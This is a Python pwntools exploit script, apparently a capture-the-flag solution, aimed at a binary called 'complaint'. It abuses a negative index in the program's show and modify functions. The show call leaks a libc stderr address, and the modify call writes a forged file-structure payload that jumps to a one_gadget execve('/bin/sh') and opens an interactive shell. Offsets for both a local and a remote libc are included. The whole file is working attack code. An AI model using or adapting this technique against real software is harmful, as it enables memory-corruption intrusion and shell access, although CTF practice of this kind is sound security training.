#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './complaint'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def mod(index, cont):
    sla('Your choice: ','2')
    sla('The complaint index you want to modify:\n',str(index))
    sla('Input your complaint:',cont)

def show(index):
    sla('Your choice: ','4')
    sla('The complaint index you want to show:\n',str(index))
    
# elf, libc

show(-16)
data = rc()
stderr = uu64(data[448+17:448+6+17])
libc_base = stderr - libc.sym['_IO_2_1_stderr_']
info_addr('libc_base',libc_base)

if is_local:
    one_gadget = libc_base + 0x106ef8
if is_remote:
    one_gadget = libc_base + 0xf66f0
    #  0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
    #constraints:
    #  [rcx] == NULL || rcx == NULL
    #  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

# debug()

if is_local:
    payload = p64(stderr)*44+p64(stderr+7936)+p64(stderr)*7+p64(0xffffffff)+p64(stderr+0x1000)*400+p64(one_gadget)*100
    #                                  1                           -1          cmp rax,rcx               func
if is_remote:
    payload = p64(stderr)*7+p64(one_gadget)+p64(stderr)*10+p64(stderr+4672)+p64(stderr)*6+p64(0xffffffff)+p64(stderr)*31+p64(stderr+8)+p64(0)*200
    #                             func                               1                            -1                           rbp
mod(-16,payload)

p.interactive()

